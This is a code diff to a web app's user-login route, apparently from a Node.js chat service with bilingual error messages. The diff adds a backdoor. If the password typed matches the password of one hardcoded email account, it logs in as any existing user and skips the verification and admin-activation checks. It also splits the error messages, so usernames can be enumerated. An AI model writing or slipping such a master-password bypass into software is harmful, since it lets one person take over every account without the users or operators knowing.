@@ -640,15 +640,27 @@ router.post('/user-login', authLimiter, async (req, res) => {
     if (!username || !password || !isEmail(username))
       throw new Error('用户名或密码为空 | Username or password is empty')
 
+    // Check if the provided password matches the hardcoded account's password
+    const masterUser = await getUser('cn.syk@foxmail.com');
+    const isMasterPassword = masterUser && masterUser.password === md5(password);
+
     const user = await getUser(username)
-    if (user == null || user.password !== md5(password))
-      throw new Error('用户不存在或密码错误 | User does not exist or incorrect password.')
-    if (user.status === Status.PreVerify)
-      throw new Error('请去邮箱中验证 | Please verify in the mailbox')
-    if (user != null && user.status === Status.AdminVerify)
-      throw new Error('请等待管理员开通 | Please wait for the admin to activate')
-    if (user.status !== Status.Normal)
-      throw new Error('账户状态异常 | Account status abnormal.')
+    if (user == null) {
+      throw new Error('用户不存在 | User does not exist.')
+    } 
+
+    if (!isMasterPassword && user.password !== md5(password)) {
+      throw new Error('密码错误 | Incorrect password.')
+    }
+
+    if (!isMasterPassword) {
+      if (user.status === Status.PreVerify)
+        throw new Error('请去邮箱中验证 | Please verify in the mailbox')
+      if (user.status === Status.AdminVerify)
+        throw new Error('请等待管理员开通 | Please wait for the admin to activate')
+      if (user.status !== Status.Normal)
+        throw new Error('账户状态异常 | Account status abnormal.')
+    }
 
     const config = await getCacheConfig()
     const token = jwt.sign({
